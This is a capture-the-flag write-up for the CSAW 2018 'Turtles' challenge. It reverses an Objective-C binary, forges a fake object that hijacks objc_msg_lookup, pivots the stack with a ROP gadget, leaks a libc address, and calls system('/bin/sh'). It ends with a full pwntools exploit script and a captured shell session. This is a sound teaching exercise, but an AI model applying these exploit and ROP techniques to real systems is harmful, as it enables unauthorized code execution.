# Turtles Pwn 250 Csaw 2018

This writeup is based off of: https://jkrshnmenon.wordpress.com/2018/09/17/csaw-ctf-quals-2018-turtles-writeup/

Let's take a look at the binary:

```
$	file turtles 
turtles: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4f2c97e0c9117e9cb5aef52d8c8fe0b9ad185735, not stripped
$	pwn checksec turtles 
[*] '/Hackery/csaw18/pwn/turtle/turtles'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$	./turtles 
Here is a Turtle: 0x1920f70
15935728
Segmentation fault (core dumped)
```

Looking at this, we can see that we are dealing with a `64` bit binary, with the only binary mitigation being a non executable stack. We also see that it prints out an address of some sort, and after we gave it eight bytes of input, it crashed.

## Install library

To run this, you need install `libgnustep-base1.25`. If you are having issues, just use the sources list in this repo and run this command:

```
$	sudo apt-get install libgnustep-base1.25
```

## Reversing

So we take a look at the code in IDA, and we see this:

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax@1
  __int64 v4; // rbx@1
  int (__fastcall *v5)(__int64, char **); // rax@1
  __int64 v6; // rax@1
  __int64 v7; // rbx@1
  int (__fastcall *v8)(__int64, char **); // rax@1
  Turtle *v9; // rax@1
  Turtle *v10; // rbx@1
  void (__fastcall *v11)(Turtle *, char **, NSConstantString *); // rax@1
  Turtle *v12; // rbx@1
  void (__fastcall *v13)(Turtle *, char **); // rax@1
  uint8_t buf[2064]; // [sp+10h] [bp-830h]@1
  Turtle *turtle; // [sp+828h] [bp-18h]@1

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  LODWORD(v3) = objc_get_class("Turtle", 0LL);
  v4 = v3;
  LODWORD(v5) = objc_msg_lookup(v3, OBJC_SELECTOR_TABLE);
  LODWORD(v6) = v5(v4, OBJC_SELECTOR_TABLE);
  v7 = v6;
  LODWORD(v8) = objc_msg_lookup(v6, off_601550);
  LODWORD(v9) = v8(v7, off_601550);
  turtle = v9;
  printf("Here is a Turtle: %p\n", v9, argv);
  read(0, buf, 0x810uLL);
  memcpy(turtle, buf, 0xC8uLL);
  v10 = turtle;
  LODWORD(v11) = objc_msg_lookup(turtle, off_601560);
  v11(v10, off_601560, &OBJC_INSTANCE_1);
  v12 = turtle;
  LODWORD(v13) = objc_msg_lookup(turtle, off_601570);
  v13(v12, off_601570);
  return 0;
}
```

Looking at this code, it is clear that we are dealing with an objective C binary. The reason for that is we see functions such as `objc_get_class` and `objc_msg_lookup`. `objc_get_class` returns a class object for the name (which is the argument).

When we look at the `objc_msg_lookup()`, we see that it takes two arguments which are an object, and a table. We can also see that it returns a ptr, which is executed.

We can see later on there is a call to `read`, where it will scan in `2064` bytes of data into `buf`. Then the first `200` bytes of `buf` is copied over to the `turtle` object. In addition to that, we can see that it prints the address of the turtle object. Then a `objc_msg_lookup` call is made with `turtle` as an argument, and it's return value is exited. So if we figure out how our input influences that function, and how to get the output we want, we should be able to get code execution. Stepping through the program in a debugger shows us where it crashes:

```
[----------------------------------registers-----------------------------------]
RAX: 0xc00000069 ('i')
RBX: 0x3832373533393531 ('15935728')
RCX: 0x7fffffffd590 ("15935728\n\332\377\377\377\177")
RDX: 0xc8 
RSI: 0x601560 --> 0xc00000069 ('i')
RDI: 0x67cf70 ("15935728\n\332\377\377\377\177")
RBP: 0x7fffffffddc0 --> 0x400ce0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffd540 --> 0x7fffffffdea0 --> 0x1 
RIP: 0x7ffff73b8c89 (<objc_msg_lookup+25>:	mov    rdx,QWORD PTR [rbx+0x40])
R8 : 0x1b 
R9 : 0x7fffffffad62 --> 0x3f00000000000000 ('')
R10: 0x25 ('%')
R11: 0x7ffff6972ad0 (<__memmove_avx_unaligned_erms>:	mov    rax,rdi)
R12: 0x400a60 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffdea0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff73b8c7f <objc_msg_lookup+15>:	sub    rsp,0x8
   0x7ffff73b8c83 <objc_msg_lookup+19>:	mov    rbx,QWORD PTR [rdi]
   0x7ffff73b8c86 <objc_msg_lookup+22>:	mov    rax,QWORD PTR [rsi]
=> 0x7ffff73b8c89 <objc_msg_lookup+25>:	mov    rdx,QWORD PTR [rbx+0x40]
   0x7ffff73b8c8d <objc_msg_lookup+29>:	mov    r8d,eax
   0x7ffff73b8c90 <objc_msg_lookup+32>:	mov    rcx,rax
   0x7ffff73b8c93 <objc_msg_lookup+35>:	shl    r8d,0x5
   0x7ffff73b8c97 <objc_msg_lookup+39>:	shr    rcx,0x20
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd540 --> 0x7fffffffdea0 --> 0x1 
0008| 0x7fffffffd548 --> 0x67cf70 ("15935728\n\332\377\377\377\177")
0016| 0x7fffffffd550 --> 0x7fffffffddc0 --> 0x400ce0 (<__libc_csu_init>:	push   r15)
0024| 0x7fffffffd558 --> 0x400a60 (<_start>:	xor    ebp,ebp)
0032| 0x7fffffffd560 --> 0x7fffffffdea0 --> 0x1 
0040| 0x7fffffffd568 --> 0x0 
0048| 0x7fffffffd570 --> 0x0 
0056| 0x7fffffffd578 --> 0x400c8a (<main+262>:	lea    rdx,[rip+0x20070f]        # 0x6013a0 <_OBJC_INSTANCE_1>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00007ffff73b8c89 in objc_msg_lookup () from /usr/lib/x86_64-linux-gnu/libobjc.so.4
gdb-peda$ p $rbx+0x40
$5 = 0x3832373533393571
```

We can see here that it is trying to dereferce our input (it was `15935728`), and because it isn't a valid pointer, it is crashing. When we input a valid pointer (the one we got from the `turtle` infoleak) we see that we get past that one, and it crashes on a similar scenario:

```
[----------------------------------registers-----------------------------------]
RAX: 0x21 ('!')
RBX: 0x24c1eb0 --> 0x65646f436567 ('geCode')
RCX: 0xc ('\x0c')
RDX: 0x24c1eb0 --> 0x65646f436567 ('geCode')
RSI: 0x601560 --> 0xc00000069 ('i')
RDI: 0x24c1ef0 --> 0x24c1eb0 --> 0x65646f436567 ('geCode')
RBP: 0x7ffd770faed0 --> 0x400ce0 (<__libc_csu_init>:	push   r15)
RSP: 0x7ffd770fa650 --> 0x7ffd770fafb0 --> 0x1 
RIP: 0x7ff5396fbca8 (<objc_msg_lookup+56>:	mov    rax,QWORD PTR [rax])
R8 : 0xd2c (',\r')
R9 : 0x7ffd770f7e71 --> 0x0 
R10: 0x25 ('%')
R11: 0x7ff538cb5ad0 (<__memmove_avx_unaligned_erms>:	mov    rax,rdi)
R12: 0x400a60 (<_start>:	xor    ebp,ebp)
R13: 0x7ffd770fafb0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ff5396fbc9e <objc_msg_lookup+46>:	cmp    r8,QWORD PTR [rdx+0x28]
   0x7ff5396fbca2 <objc_msg_lookup+50>:	jb     0x7ff5396fbcc0 <objc_msg_lookup+80>
   0x7ff5396fbca4 <objc_msg_lookup+52>:	mov    rax,QWORD PTR [rdx+0x8]
=> 0x7ff5396fbca8 <objc_msg_lookup+56>:	mov    rax,QWORD PTR [rax]
   0x7ff5396fbcab <objc_msg_lookup+59>:	test   rax,rax
   0x7ff5396fbcae <objc_msg_lookup+62>:	je     0x7ff5396fbce0 <objc_msg_lookup+112>
   0x7ff5396fbcb0 <objc_msg_lookup+64>:	add    rsp,0x8
   0x7ff5396fbcb4 <objc_msg_lookup+68>:	pop    rbx
[------------------------------------stack-------------------------------------]
0000| 0x7ffd770fa650 --> 0x7ffd770fafb0 --> 0x1 
0008| 0x7ffd770fa658 --> 0x24c1ef0 --> 0x24c1eb0 --> 0x65646f436567 ('geCode')
0016| 0x7ffd770fa660 --> 0x7ffd770faed0 --> 0x400ce0 (<__libc_csu_init>:	push   r15)
0024| 0x7ffd770fa668 --> 0x400a60 (<_start>:	xor    ebp,ebp)
0032| 0x7ffd770fa670 --> 0x7ffd770fafb0 --> 0x1 
0040| 0x7ffd770fa678 --> 0x0 
0048| 0x7ffd770fa680 --> 0x0 
0056| 0x7ffd770fa688 --> 0x400c8a (<main+262>:	lea    rdx,[rip+0x20070f]        # 0x6013a0 <_OBJC_INSTANCE_1>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00007ff5396fbca8 in objc_msg_lookup () from /usr/lib/x86_64-linux-gnu/libobjc.so.4
gdb-peda$ p $rax
$3 = 0x21
```

From this, it is clear that we will have to make a fake chunk that we can pass to `objc_msg_lookup` that when it tries to dereference all of the various peices of our chunk, it won't crash. What I will do is place a ptr to the start of the chunk, everywhere it looks for a ptr:

Here are some of the checks we need to worry about: 
```
objc_msg_lookup+19
x = dereferenced first eight bytes of chunks

objc_msg_lookup+25
x = dereferenced (x + 0x40) 

objc_msg_lookup+52
x = dereferenced (x + 0x8)

objc_msg_lookup+56
x = dereferenced (x)
```

later on we see some checks like these:

```
objc_msg_lookup+85
x = dereferenced(x + 0x348)

objc_msg_lookup+89
x = dereferenced(x + 0x60)
```

the issue with these checks (particularly the first), is that the dereference a value greater than `0xc8` (the amount of data we get to write to the `turtle` object with `memcpy`), so it stretches beyond the scope of our chunk. However before we hit this code path, we can see a conditional jump that we can influence:

```
=> 0x7ff4fb89fc9e <objc_msg_lookup+46>:	cmp    r8,QWORD PTR [rdx+0x28]
   0x7ff4fb89fca2 <objc_msg_lookup+50>:	jb     0x7ff4fb89fcc0 <objc_msg_lookup+80>
```

Here it just checks to see if a value from our chunk (`0x28` bytes from the start) is greater than the value stored in the `r8` register, and if it is, it jumps to the code path with the checks beyond the scope of our fake chunks. We can just set that value of our chunk equal to `0x0`, so the jump condition should never be satisfied, and we will never hit that code path. Looking through the assembly code, we can see the same condition four times.

With that info we can create a fake chunk which will allow is to get through `objc_msg_lookup` without crashing:

```
turtle = address of 0x0
0x0 - 0x8:	turtle
0x8 - 0x10:	turtle
0x10 - 0x28:  filler data 
0x28 - 0x30: 0x0
0x30 - 0x40: filler data
0x40 - 0x48: turtle
``` 

And later on, we can see that the value returned (which is executed with `call rax` at `0x400cab`) is equivalent to the ptr to the start of our fake chunk. A bit of tinkering reveals that it is the last dereferenced value which gets executed (like the one at `objc_msg_lookup+56`).  With that, we can adjust our fake chunk slightly to control the address which is returned (and thus executed):

```
turtle = address of 0x0
0x0 - 0x8:	turtle
0x8 - 0x10:	turtle + 0x10
0x10 - 0x18:	ROP Gadget (address which is returned then executed)
0x18 - 0x28:  filler data 
0x28 - 0x30: 0x0
0x30 - 0x40: filler data
0x40 - 0x48: turtle
```

With that fake chunk, we get code exec.

## ROP

Now that we have code exec, we have to decide what to do. We can only execute a single gadget, so our best bet is to try and move the stack frame into a region of memory we control. Looking at the memory of the stack at the time of the `call rax` instruction, we can see that our input is close on the stack (in this case my filler input is zeroes, which is `0x30`):

```
[----------------------------------registers-----------------------------------]
RAX: 0x400d3a (<__libc_csu_init+90>:	pop    rbx)
RBX: 0x20f4ef0 (0x00000000020f4ef0)
RCX: 0xc ('\x0c')
RDX: 0x6013a0 --> 0x7f5e6479ab80 --> 0x7f5e6479aec0 --> 0x7f5e6408aa00 (0x00007f5e6408aa00)
RSI: 0x601560 --> 0xc00000069 ('i')
RDI: 0x20f4ef0 (0x00000000020f4ef0)
RBP: 0x7ffca50fc9e0 --> 0x400ce0 (<__libc_csu_init>:	push   r15)
RSP: 0x7ffca50fc1a0 --> 0x7ffca50fcac8 --> 0x7ffca50fd25f ("./turtles")
RIP: 0x400c9b (<main+279>:	call   rax)
R8 : 0xd2c (',\r')
R9 : 0x7ffca50f9981 --> 0x0 
R10: 0x25 ('%')
R11: 0x7f5e6343aad0 (<__memmove_avx_unaligned_erms>:	mov    rax,rdi)
R12: 0x400a60 (<_start>:	xor    ebp,ebp)
R13: 0x7ffca50fcac0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400c8a <main+262>:	
    lea    rdx,[rip+0x20070f]        # 0x6013a0 <_OBJC_INSTANCE_1>
   0x400c91 <main+269>:	
    lea    rsi,[rip+0x2008c8]        # 0x601560 <_OBJC_SELECTOR_TABLE+32>
   0x400c98 <main+276>:	mov    rdi,rbx
=> 0x400c9b <main+279>:	call   rax
   0x400c9d <main+281>:	mov    rbx,QWORD PTR [rbp-0x18]
   0x400ca1 <main+285>:	
    lea    rsi,[rip+0x2008c8]        # 0x601570 <_OBJC_SELECTOR_TABLE+48>
   0x400ca8 <main+292>:	mov    rdi,rbx
   0x400cab <main+295>:	call   0x4009f0 <objc_msg_lookup@plt>
Guessed arguments:
arg[0]: 0x20f4ef0 (0x00000000020f4ef0)
arg[1]: 0x601560 --> 0xc00000069 ('i')
arg[2]: 0x6013a0 --> 0x7f5e6479ab80 --> 0x7f5e6479aec0 --> 0x7f5e6408aa00 (0x00007f5e6408aa00)
[------------------------------------stack-------------------------------------]
0000| 0x7ffca50fc1a0 --> 0x7ffca50fcac8 --> 0x7ffca50fd25f ("./turtles")
0008| 0x7ffca50fc1a8 --> 0x100000000 
0016| 0x7ffca50fc1b0 --> 0x20f4ef0 (0x00000000020f4ef0)
0024| 0x7ffca50fc1b8 --> 0x20f4f00 --> 0x400d3a (<__libc_csu_init+90>:	pop    rbx)
0032| 0x7ffca50fc1c0 --> 0x400d3a (<__libc_csu_init+90>:	pop    rbx)
0040| 0x7ffca50fc1c8 ('0' <repeats 16 times>)
0048| 0x7ffca50fc1d0 ("00000000")
0056| 0x7ffca50fc1d8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000400c9b	31	in turtles.m
gdb-peda$ x/20g 0x7ffca50fc1d8
0x7ffca50fc1d8:	0x0000000000000000	0x3030303030303030
0x7ffca50fc1e8:	0x3030303030303030	0x00000000020f4ef0
0x7ffca50fc1f8:	0x3030303030303030	0x3030303030303030
0x7ffca50fc208:	0x3030303030303030	0x00000000020f4ef0
0x7ffca50fc218:	0x3030303030303030	0x3030303030303030
0x7ffca50fc228:	0x3030303030303030	0x3030303030303030
0x7ffca50fc238:	0x3030303030303030	0x3030303030303030
0x7ffca50fc248:	0x3030303030303030	0x3030303030303030
0x7ffca50fc258:	0x3030303030303030	0x3030303030303030
0x7ffca50fc268:	0x3030303030303030	0x3030303030303030
```

Now at `0x400d3a`, there is a ROP gadget that will pop 6 values off the stack and return:

```
pop     rbx
pop     rbp
pop     r12
pop     r13
pop     r14
pop     r15
retn
```

When we run this as our one gadget, we find that the stack frame ends up in our input, and we end up executing our input as instruction addresses. However after that gadget, it will return to `0x7ffca50fc1f8`:

```
[----------------------------------registers-----------------------------------]
RAX: 0x400d3a (<__libc_csu_init+90>:	pop    rbx)
RBX: 0x400c9d (<main+281>:	mov    rbx,QWORD PTR [rbp-0x18])
RCX: 0xc ('\x0c')
RDX: 0x6013a0 --> 0x7f5e6479ab80 --> 0x7f5e6479aec0 --> 0x7f5e6408aa00 (0x00007f5e6408aa00)
RSI: 0x601560 --> 0xc00000069 ('i')
RDI: 0x20f4ef0 (0x00000000020f4ef0)
RBP: 0x7ffca50fcac8 --> 0x7ffca50fd25f ("./turtles")
RSP: 0x7ffca50fc1c8 ('0' <repeats 16 times>)
RIP: 0x400d44 (<__libc_csu_init+100>:	ret)
R8 : 0xd2c (',\r')
R9 : 0x7ffca50f9981 --> 0x0 
R10: 0x25 ('%')
R11: 0x7f5e6343aad0 (<__memmove_avx_unaligned_erms>:	mov    rax,rdi)
R12: 0x100000000 
R13: 0x20f4ef0 (0x00000000020f4ef0)
R14: 0x20f4f00 --> 0x400d3a (<__libc_csu_init+90>:	pop    rbx)
R15: 0x400d3a (<__libc_csu_init+90>:	pop    rbx)
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400d3e <__libc_csu_init+94>:	pop    r13
   0x400d40 <__libc_csu_init+96>:	pop    r14
   0x400d42 <__libc_csu_init+98>:	pop    r15
=> 0x400d44 <__libc_csu_init+100>:	ret    
   0x400d45:	data16 nop WORD PTR cs:[rax+rax*1+0x0]
   0x400d50 <__libc_csu_fini>:	repz ret 
   0x400d52:	add    BYTE PTR [rax],al
   0x400d54 <_fini>:	sub    rsp,0x8
[------------------------------------stack-------------------------------------]
0000| 0x7ffca50fc1c8 ('0' <repeats 16 times>)
0008| 0x7ffca50fc1d0 ("00000000")
0016| 0x7ffca50fc1d8 --> 0x0 
0024| 0x7ffca50fc1e0 ('0' <repeats 16 times>, "\360N\017\002")
0032| 0x7ffca50fc1e8 ("00000000\360N\017\002")
0040| 0x7ffca50fc1f0 --> 0x20f4ef0 (0x00000000020f4ef0)
0048| 0x7ffca50fc1f8 ('0' <repeats 24 times>, "\360N\017\002")
0056| 0x7ffca50fc200 ('0' <repeats 16 times>, "\360N\017\002")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000400d44 in __libc_csu_init ()
gdb-peda$ i f
Stack level 0, frame at 0x7ffca50fc1c8:
 rip = 0x400d44 in __libc_csu_init; saved rip = 0x3030303030303030
 called by frame at 0x7ffca50fc1d8
 Arglist at 0x7ffca50fc1c0, args: 
 Locals at 0x7ffca50fc1c0, Previous frame's sp is 0x7ffca50fc1d0
 Saved registers:
  rip at 0x7ffca50fc1c8
gdb-peda$ x/20g 0x7ffca50fc1f8
0x7ffca50fc1f8:	0x3030303030303030	0x3030303030303030
0x7ffca50fc208:	0x3030303030303030	0x00000000020f4ef0
0x7ffca50fc218:	0x3030303030303030	0x3030303030303030
0x7ffca50fc228:	0x3030303030303030	0x3030303030303030
0x7ffca50fc238:	0x3030303030303030	0x3030303030303030
0x7ffca50fc248:	0x3030303030303030	0x3030303030303030
0x7ffca50fc258:	0x3030303030303030	0x3030303030303030
0x7ffca50fc268:	0x3030303030303030	0x3030303030303030
0x7ffca50fc278:	0x3030303030303030	0x3030303030303030
0x7ffca50fc288:	0x3030303030303030	0x3030303030303030
``` 

Looking at this, we can see that we will have `24` bytes worth of instructions before our innput is interrupted at `0x7ffca50fc210` by `0x00000000020f4ef0`. We can just call the same ROP gadget to pop six more values off of the stack, that way when it returns, we will have plenty of space to work with for our ROP Chain. Luckily for us, to do this we just have to place the gadget again in the spot immeditely after the first gadget in the fake chunk.

Now for the ROP Chain, we will be making two of them. The first is to make a call to `printf` (using the plt address since it's an imported function) with the got address (ptr to libc address) of `printf`, which will allow us to break ASLR in libc, and know the address of `system`. After this ROP chain, we will just return to main again to rexecute the bug, and get a shell.

Find the ROP gagdet to pop a value into the `rdi` register:
```
$	ROPgadget --binary turtles | grep 'pop rdi'
0x0000000000400d43 : pop rdi ; ret
``` 

get the plt address of `printf`:
```
$	objdump -D turtles | grep printf
00000000004009d0 <printf@plt>:
  400c3e:	e8 8d fd ff ff       	callq  4009d0 <printf@plt>
```

get the got address of `printf`:
```
$	objdump -R turtles | grep printf
0000000000601290 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
```

get the address of `main (0x400b84)`:
```
$	objdump -D turtles | grep main
0000000000400a40 <__libc_start_main@plt>:
  400a84:	e8 b7 ff ff ff       	callq  400a40 <__libc_start_main@plt>
0000000000400b84 <main>:
```

with that, we can build our first ROP chain:
```
pop rdi, ret;
got printf address
plt printf address
main address
```

after that, we get our second ROP Chain, which just calls system using it's libc address. Also the string `/bin/sh` will be stored at `turtle+0x48` for this chunk:
```
pop rdi, ret;
turtle+0x48
libc system
```

## Exploit

Pulling it all together, we have the following exploit.

```
# This exploit is based off of: https://jkrshnmenon.wordpress.com/2018/09/17/csaw-ctf-quals-2018-turtles-writeup/

from pwn import *

# Establish the target
target = remote('pwn.chal.csaw.io', 9003)
#target = process('./turtles')
#gdb.attach(target, gdbscript='b *0x400c8a')

# Establish the binaries so we can get symbols
elf = ELF('./turtles')
libc = ELF('libc.so.6')

# Establish the needed ROP gadgets & addresses
popRegisters = p64(0x400d3a) # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
popRdi = p64(0x400d43) # pop rdi ; ret

pltPrintf = p64(elf.plt['printf'])
gotPrintf = p64(elf.got['printf'])
gotRead = p64(elf.got['read'])

main = p64(0x400b84)

# Scan in and parse out the address of the turtle object
def initalTurtle():
	print target.recvuntil('Here is a Turtle: ')
	leak = target.recvline()
	leak.replace('\x0a', '')
	leak = int(leak, 16)
	log.info('The leak is: ' + hex(leak))
	return leak

leak = initalTurtle()

# Establish the first ROP Chain for the printf infoleak
chain0 = ""
chain0 += popRdi
chain0 += gotPrintf
chain0 += pltPrintf
chain0 += main

# Establish the first fake chunk
chunk = fit({0: p64(leak),
			 0x8: p64(leak+0x10),
			 0x10: popRegisters,
			 0x18: popRegisters,
			 0x28: p64(0x0),
			 0x40: p64(leak),
			 0x50: chain0}, length=0x100)

# Send the fake chunk
target.sendline(chunk)

# Scan in the libc address of printf, then calculate the address of libc base and system
libcPrintf = u64(target.recv(6) + "\x00\x00")
libcBase = libcPrintf - libc.symbols['printf']
libcSystem = libcBase + libc.symbols['system']
log.info("Address of printf: " + hex(libcPrintf))
log.info("Address of system: " + hex(libcSystem))
log.info("Address of libc base: " + hex(libcBase))

# Get the infoleak for the new turtle object
leak = initalTurtle()

# Establish the second ROP Chain to call System
chain1 = ""
chain1 += popRdi
chain1 += p64(leak + 0x48)
chain1 += p64(libcSystem)

# Establish the second fake chunk
chunk = fit({0: p64(leak),
			 0x8: p64(leak+0x10),
			 0x10: popRegisters,
			 0x18: popRegisters,
			 0x28: p64(0x0),
			 0x40: p64(leak),
			 0x48: '/bin/sh\x00',
			 0x50: chain1}, length=0x100)

# Send the second fake chunk
target.sendline(chunk)

# Drop to an interactive shell to use our new shell
target.interactive()
```

and when we run it:

```
$	python exploit.py 
[+] Starting local process './turtles': pid 14027
[*] running in new terminal: /usr/bin/gdb -q  "/home/meinkea/Desktop/ttt/turtles" 14027 -x "/tmp/pwn3d5lGY.gdb"
[+] Waiting for debugger: Done
[*] '/home/meinkea/Desktop/ttt/turtles'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/meinkea/Desktop/ttt/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
Here is a Turtle: 
[*] The leak is: 0x138c670
[*] Address of printf: 0x7f3b2112c510
[*] Address of system: 0x7f3b2111b6a0
[*] Address of libc base: 0x7f3b210d6000
Here is a Turtle: 
[*] The leak is: 0x13be600
[*] Switching to interactive mode
$ ls
core  exploit.py  libc.so.6  peda-session-turtles.txt  solved.py  turtles
$ w
 00:41:07 up  6:28,  1 user,  load average: 0.20, 0.14, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
meinkea  tty7     :0               16Sep18 15days  7:38   0.03s /bin/sh /usr/lib/gnome-session/run-systemd-session ubuntu-session.target
```